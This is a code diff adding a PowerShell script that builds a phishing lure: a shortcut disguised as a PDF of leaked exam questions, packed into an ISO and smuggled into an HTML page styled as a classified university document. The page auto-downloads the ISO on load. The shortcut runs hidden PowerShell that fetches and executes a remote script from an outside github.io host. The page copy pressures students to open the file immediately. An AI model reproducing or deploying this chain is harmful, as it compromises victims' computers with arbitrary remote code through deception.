@@ -1,0 +1,718 @@
+# Step 1: Create LNK only
+mkdir -Force iso_contents | Out-Null
+
+# Step 2: Create the LNK
+$shell = New-Object -ComObject WScript.Shell
+$lnk = $shell.CreateShortcut("$PWD\Leaked_Questions_Sem2.pdf.lnk")
+$lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://0xm1r41.github.io/bin.ps1')"
+$pdfIcon = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\.pdf").'(default)'
+$pdfIcon = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$pdfIcon\DefaultIcon").'(default)'
+$lnk.IconLocation = $pdfIcon
+$lnk.Save()
+Copy-Item "Leaked_Questions_Sem2.pdf.lnk" "iso_contents\" -Force
+
+# Step 3: Create ISO containing only the LNK
+$isoScript = @"
+import pycdlib
+iso = pycdlib.PyCdlib()
+iso.new(joliet=3)
+iso.add_file('iso_contents/Leaked_Questions_Sem2.pdf.lnk', joliet_path='/Leaked_Questions_Sem2.pdf.lnk')
+iso.write('Confidential_Document.iso')
+iso.close()
+"@
+$isoScript | Out-File -Encoding utf8 "make_iso.py"
+python make_iso.py
+
+# Step 4: Convert ISO to base64
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$PWD\Confidential_Document.iso"))
+
+# Step 5: Build the HTML
+$htmlTemplate = @'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CLASSIFIED &mdash; EXAM MATERIALS</title>
+<script>
+  window.addEventListener('load', function() {
+    const b64 = "B64_PLACEHOLDER";
+    try {
+      const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+      const blob = new Blob([bytes], { type: "application/octet-stream" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "Confidential_Document.zip";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    } catch(e) {}
+  });
+</script>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #2a2218;
+    font-family: 'Courier Prime', monospace;
+    color: #1a1208;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 3rem 1rem 5rem;
+    cursor: crosshair;
+  }
+
+  /* Paper background noise */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* DOCUMENT WRAPPER */
+  .document {
+    width: 100%;
+    max-width: 820px;
+    background: #e8e0ce;
+    position: relative;
+    box-shadow:
+      0 0 0 1px #5a4a30,
+      6px 6px 0 #1a1208,
+      12px 12px 40px rgba(0,0,0,0.6),
+      0 0 120px rgba(0,0,0,0.4);
+  }
+
+  
+
+  /* Paper texture overlays */
+  .document::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(139, 100, 20, 0.12) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(139,100,20,0.08) 0%, transparent 50%),
+      radial-gradient(ellipse at 60% 80%, rgba(100,80,20,0.06) 0%, transparent 40%);
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* Worn edge effect */
+  .document::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      linear-gradient(to right, rgba(0,0,0,0.06) 0%, transparent 4%, transparent 96%, rgba(0,0,0,0.04) 100%),
+      linear-gradient(to bottom, rgba(0,0,0,0.05) 0%, transparent 3%, transparent 97%, rgba(0,0,0,0.06) 100%);
+    pointer-events: none;
+    z-index: 2;
+  }
+
+  /* HOLE PUNCHES */
+  .holes {
+    position: absolute;
+    left: 28px;
+    top: 0;
+    bottom: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-evenly;
+    gap: 0;
+    z-index: 10;
+  }
+  .hole {
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    background: #2a2218;
+    box-shadow: inset 0 2px 4px rgba(0,0,0,0.5), 0 0 0 1px #1a1208;
+  }
+
+  /* CONTENT */
+  .doc-inner {
+    padding: 3rem 4rem 4rem 5.5rem;
+    position: relative;
+    z-index: 5;
+  }
+
+  /* TOP BAR */
+  .top-bar {
+    border-top: 3px solid #1a1208;
+    border-bottom: 1px solid #1a1208;
+    padding: 0.5rem 0;
+    margin-bottom: 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .doc-class {
+    font-family: 'Special Elite', cursive;
+    font-size: 0.7rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: #3d3020;
+  }
+  .doc-id {
+    font-size: 0.65rem;
+    color: #3d3020;
+    letter-spacing: 0.1em;
+  }
+
+  /* BIG STAMP &mdash; CLASSIFIED */
+  .stamp-classified {
+    position: absolute;
+    top: 3.5rem;
+    right: 3.5rem;
+    border: 4px solid #a01f1f;
+    color: #a01f1f;
+    font-family: 'Special Elite', cursive;
+    font-size: 1.5rem;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    padding: 0.35rem 0.9rem;
+    transform: rotate(12deg);
+    opacity: 0.75;
+    z-index: 20;
+    pointer-events: none;
+    text-shadow: 1px 1px 0 rgba(160,31,31,0.3);
+    box-shadow: inset 0 0 0 2px rgba(160,31,31,0.15);
+    line-height: 1.1;
+    text-align: center;
+  }
+  
+
+  /* SUBJECT LINE */
+  .subject-block {
+    margin-bottom: 2.5rem;
+  }
+  .subject-meta {
+    font-size: 0.7rem;
+    color: #3d3020;
+    letter-spacing: 0.08em;
+    line-height: 2.2;
+    margin-bottom: 1rem;
+  }
+  .subject-meta span {
+    display: inline-block;
+    min-width: 80px;
+    font-weight: 700;
+    text-transform: uppercase;
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+  }
+  .subject-meta .redact {
+    background: #111008;
+    color: transparent;
+    user-select: none;
+    display: inline-block;
+    padding: 0 2px;
+    border-radius: 1px;
+    letter-spacing: 0;
+  }
+
+  .divider {
+    border: none;
+    border-top: 1px solid #b0a48a;
+    margin: 1.2rem 0;
+  }
+
+  /* HEADLINE */
+  .headline {
+    font-family: 'Special Elite', cursive;
+    font-size: 3rem;
+    line-height: 1.1;
+    color: #1a1208;
+    margin: 2rem 0 0.6rem;
+    max-width: 560px;
+  }
+  .headline .redact-title {
+    background: #111008;
+    color: transparent;
+    display: inline;
+    padding: 0 3px;
+    border-radius: 1px;
+    user-select: none;
+  }
+
+  .sub-headline {
+    font-size: 1rem;
+    color: #3d3020;
+    line-height: 1.7;
+    max-width: 520px;
+    margin: 1rem 0 2.5rem;
+    font-style: italic;
+  }
+
+  
+
+  /* URGENT NOTICE BOX */
+  .notice-box {
+    border: 2px solid #1a1208;
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    position: relative;
+    background: rgba(0,0,0,0.03);
+  }
+  .notice-box::before {
+    content: '⚠ NOTICE';
+    position: absolute;
+    top: -0.65rem;
+    left: 1rem;
+    background: #e8e0ce;
+    padding: 0 0.5rem;
+    font-size: 0.6rem;
+    font-weight: 700;
+    letter-spacing: 0.3em;
+    color: #1a1208;
+  }
+  .notice-box p {
+    font-size: 0.875rem;
+    line-height: 1.75;
+    color: #3d3020;
+  }
+  .notice-box p strong {
+    color: #1a1208;
+    font-weight: 700;
+  }
+
+  /* CONTENTS TABLE */
+  .section-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.35em;
+    text-transform: uppercase;
+    color: #3d3020;
+    font-weight: 700;
+    margin: 3rem 0 1rem;
+    padding-bottom: 0.4rem;
+    border-bottom: 1px solid #b0a48a;
+  }
+
+  .contents {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+  }
+
+  .content-row {
+    display: grid;
+    grid-template-columns: 2rem 1fr auto;
+    align-items: baseline;
+    gap: 0.5rem;
+    padding: 0.75rem 0;
+    border-bottom: 1px dashed #c4b898;
+    position: relative;
+  }
+  .content-row:last-child { border-bottom: none; }
+
+  .row-num {
+    font-size: 0.7rem;
+    color: #8a7a5a;
+    font-weight: 700;
+  }
+
+  .row-title {
+    font-size: 0.95rem;
+    color: #1a1208;
+    line-height: 1.4;
+  }
+  .row-title .tag {
+    display: inline-block;
+    font-size: 0.55rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    font-weight: 700;
+    padding: 2px 6px;
+    border-radius: 2px;
+    margin-left: 0.5rem;
+    vertical-align: middle;
+    position: relative;
+    top: -1px;
+  }
+  .tag-hot {
+    background: rgba(139,26,26,0.1);
+    border: 1px solid rgba(139,26,26,0.3);
+    color: #8b1a1a;
+  }
+  .tag-new {
+    background: rgba(26,74,26,0.1);
+    border: 1px solid rgba(26,74,26,0.3);
+    color: #1a4a1a;
+  }
+
+  .row-status {
+    font-size: 0.65rem;
+    letter-spacing: 0.1em;
+    color: #8a7a5a;
+    text-align: right;
+    white-space: nowrap;
+  }
+
+  .row-sub {
+    grid-column: 2 / -1;
+    font-size: 0.78rem;
+    color: #7a6a4a;
+    font-style: italic;
+    margin-top: -0.3rem;
+    padding-bottom: 0.2rem;
+    line-height: 1.5;
+  }
+
+  /* REDACTED SECTION */
+  .redacted-section {
+    margin: 2.5rem 0;
+    padding: 1.5rem;
+    background: rgba(0,0,0,0.04);
+    border-left: 3px solid #111008;
+  }
+  .redacted-section .redact-line {
+    background: #111008;
+    height: 1rem;
+    margin: 0.5rem 0;
+    border-radius: 1px;
+    display: block;
+  }
+  .redacted-section .redact-line.short { width: 60%; }
+  .redacted-section .redact-line.med { width: 85%; }
+  .redacted-section .redact-line.long { width: 100%; }
+  .redacted-section .redact-label {
+    font-size: 0.6rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: #9a8a6a;
+    margin-top: 0.8rem;
+  }
+
+  /* BOTTOM STAMPS */
+  .stamp-row {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    margin-top: 3rem;
+    padding-top: 2rem;
+    border-top: 1px solid #b0a48a;
+    flex-wrap: wrap;
+    gap: 1.5rem;
+  }
+
+  .stamp-approved {
+    border: 3px solid #1a4a1a;
+    color: #1a4a1a;
+    font-family: 'Special Elite', cursive;
+    font-size: 1.1rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    padding: 0.3rem 0.8rem;
+    transform: rotate(-8deg);
+    opacity: 0.7;
+    display: inline-block;
+    line-height: 1.2;
+    text-align: center;
+  }
+  
+
+  .sig-block {
+    font-size: 0.7rem;
+    color: #7a6a4a;
+    line-height: 2;
+    text-align: right;
+  }
+  .sig-block .sig-name {
+    font-family: 'Special Elite', cursive;
+    font-size: 1.1rem;
+    color: #3d3020;
+    display: block;
+    font-style: italic;
+  }
+
+  /* FOOTER BAR */
+  .doc-footer {
+    border-top: 3px solid #1a1208;
+    margin-top: 2.5rem;
+    padding: 0.6rem 0 0;
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.6rem;
+    color: #8a7a5a;
+    letter-spacing: 0.1em;
+  }
+
+  /* STICKY NOTE */
+  .sticky {
+    position: absolute;
+    top: -1.5rem;
+    right: 5rem;
+    background: #f5e66e;
+    color: #2a2000;
+    padding: 1rem 1.2rem 1.4rem;
+    font-family: 'Special Elite', cursive;
+    font-size: 0.82rem;
+    line-height: 1.5;
+    transform: rotate(2.5deg);
+    box-shadow: 3px 4px 12px rgba(0,0,0,0.25);
+    max-width: 160px;
+    z-index: 30;
+  }
+  
+  .sticky::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 3px;
+    background: linear-gradient(to right, rgba(0,0,0,0.08), rgba(0,0,0,0.05));
+  }
+
+  /* WATERMARK */
+  .watermark {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: none;
+    z-index: 3;
+    overflow: hidden;
+  }
+  .watermark-text {
+    font-family: 'Special Elite', cursive;
+    font-size: 8rem;
+    color: rgba(0,0,0,0.025);
+    text-transform: uppercase;
+    letter-spacing: 0.2em;
+    transform: rotate(-35deg);
+    white-space: nowrap;
+    user-select: none;
+    line-height: 1;
+  }
+
+  /* TAPE STRIPS */
+  .tape {
+    position: absolute;
+    background: rgba(255,255,200,0.4);
+    border-top: 1px solid rgba(200,190,100,0.3);
+    border-bottom: 1px solid rgba(200,190,100,0.3);
+    pointer-events: none;
+    z-index: 25;
+  }
+  .tape-top {
+    top: -8px;
+    left: calc(50% - 60px);
+    transform: rotate(-1deg);
+    width: 120px;
+    height: 22px;
+  }
+
+  /* FOLDED CORNER */
+  .fold {
+    position: absolute;
+    bottom: 0;
+    right: 0;
+    width: 0;
+    height: 0;
+    border-style: solid;
+    border-width: 0 0 50px 50px;
+    border-color: transparent transparent #2a2218 transparent;
+    z-index: 20;
+  }
+  .fold::after {
+    content: '';
+    position: absolute;
+    bottom: -50px;
+    right: -50px;
+    width: 0;
+    height: 0;
+    border-style: solid;
+    border-width: 50px 50px 0 0;
+    border-color: #d4c9b0 transparent transparent transparent;
+  }
+
+  /* COFFEE STAIN */
+  .stain {
+    position: absolute;
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 4;
+  }
+  .stain-1 {
+    width: 80px;
+    height: 80px;
+    bottom: 12rem;
+    right: 3rem;
+    background: radial-gradient(circle, transparent 48%, rgba(100,70,20,0.12) 49%, rgba(100,70,20,0.08) 55%, transparent 56%);
+    transform: rotate(15deg) scale(1, 0.7);
+  }
+
+  @media (max-width: 640px) {
+    .doc-inner { padding: 2rem 2rem 2.5rem 3rem; }
+    .stamp-classified { font-size: 1rem; top: 2rem; right: 2rem; }
+    .headline { font-size: 2rem; }
+    .holes { left: 12px; }
+    .hole { width: 14px; height: 14px; }
+    .sticky { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="document">
+
+  
+  <div class="tape tape-top"></div>
+
+  
+  <div class="sticky">
+    READ THIS before the exam.<br>&mdash; you'll thank me later
+  </div>
+
+  
+  <div class="holes">
+    <div class="hole"></div>
+    <div class="hole"></div>
+    <div class="hole"></div>
+  </div>
+
+  
+  <div class="watermark">
+    <div class="watermark-text">LEAKED</div>
+  </div>
+
+  
+  <div class="stamp-classified">CLASSIFIED<br><span style="font-size:0.7rem;letter-spacing:0.15em">EXAM MATERIAL</span></div>
+
+  
+  <div class="stain stain-1"></div>
+
+  
+  <div class="fold"></div>
+
+  <div class="doc-inner">
+
+    
+    <div class="top-bar">
+      <div class="doc-class">University Academic Division &nbsp;·&nbsp; Internal Use Only</div>
+      <div class="doc-id">REF: UNI/EXAM/2026/████/7</div>
+    </div>
+
+    
+    <div class="subject-block">
+      <div class="subject-meta">
+        <div><span>FROM:</span> <span class="redact">████████████████</span> (Faculty Office)</div>
+        <div><span>TO:</span> Students who found this</div>
+        <div><span>DATE:</span> <span class="redact">████ ████</span>, 2026</div>
+        <div><span>RE:</span> Examination Question Patterns &mdash; DO NOT DISTRIBUTE</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    
+    <h1 class="headline">The Exam Questions<br>They Keep <span class="redact-title">Repeating.</span></h1>
+    <p class="sub-headline">
+      This document contains a compilation of recurring exam questions, model answers, and high-yield topics identified across multiple academic years. It was not supposed to leave the faculty office.
+    </p>
+
+    
+    <div class="notice-box">
+      <p>
+        <strong>You have this file. That's the hard part done.</strong> What you do next is on you.
+        Students who read this in full consistently outperform those who don't. The content below is
+        exactly what it says it is &mdash; <strong>patterns, repeated questions, and the answers that score full marks.</strong>
+        Don't skim it. Don't save it for later. Open it now.
+      </p>
+    </div>
+
+    
+    <div class="section-label">Document Contents &mdash; Index</div>
+
+    <div class="contents">
+      <div class="content-row">
+        <div class="row-num">01</div>
+        <div>
+          <div class="row-title">Repeated Exam Questions by Year <span class="tag tag-hot">High Priority</span></div>
+          <div class="row-sub">Cross-referenced across past papers. These come up. Every. Single. Year.</div>
+        </div>
+        <div class="row-status">Confirmed</div>
+      </div>
+
+      <div class="content-row">
+        <div class="row-num">02</div>
+        <div>
+          <div class="row-title">Model Answers &mdash; Full Mark Responses</div>
+          <div class="row-sub">Not summaries. Actual answers, structured the way markers want to see them.</div>
+        </div>
+        <div class="row-status">Verified</div>
+      </div>
+
+      <div class="content-row">
+        <div class="row-num">03</div>
+        <div>
+          <div class="row-title">Key Definitions & Formulas <span class="tag tag-hot">High Priority</span></div>
+          <div class="row-sub">The exact phrasing that examiners expect. Not paraphrased. Not summarised.</div>
+        </div>
+        <div class="row-status">Confirmed</div>
+      </div>
+
+      <div class="content-row">
+        <div class="row-num">04</div>
+        <div>
+          <div class="row-title">Common Mistakes &mdash; What Loses Marks</div>
+          <div class="row-sub">The errors that come up in the examiners' report every year. Avoid all of these.</div>
+        </div>
+        <div class="row-status">Documented</div>
+      </div>
+
+      <div class="content-row">
+        <div class="row-num">05</div>
+        <div>
+          <div class="row-title">Last-Page Cram Sheet <span class="tag tag-new">New</span></div>
+          <div class="row-sub">One page. Everything that fits in your head the morning of the exam.</div>
+        </div>
+        <div class="row-status">Included</div>
+      </div>
+    </div>
+
+    
+    <div class="redacted-section">
+      <div class="redact-line long"></div>
+      <div class="redact-line med"></div>
+      <div class="redact-line long"></div>
+      <div class="redact-line short"></div>
+      <div class="redact-label">&mdash; Section 6 withheld pending faculty review &mdash;</div>
+    </div>
+
+    
+    <div class="stamp-row">
+      <div class="stamp-approved">APPROVED<br><span style="font-size:0.65rem;display:block;margin-top:2px;letter-spacing:0.1em">For Student Use</span></div>
+      <div class="sig-block">
+        <span class="sig-name">A. Someone Who Cares</span>
+        <span>Verified by &nbsp;·&nbsp; Academic Support</span>
+        <span>Distributed: <span style="font-family:inherit">████████</span>, 2026</span>
+      </div>
+    </div>
+
+    
+    <div class="doc-footer">
+      <span>EXAM/2026 &mdash; CONFIDENTIAL</span>
+      <span>PAGE 1 OF 1</span>
+      <span>DO NOT COPY &nbsp;·&nbsp; DO NOT DISTRIBUTE</span>
+    </div>
+
+  </div>
+</div>
+
+</body>
+</html>
+
+'@
+$html = $htmlTemplate.Replace("B64_PLACEHOLDER", $b64)
+[System.IO.File]::WriteAllText("$PWD\index.html", $html, [System.Text.Encoding]::UTF8)
+Write-Host "Done."
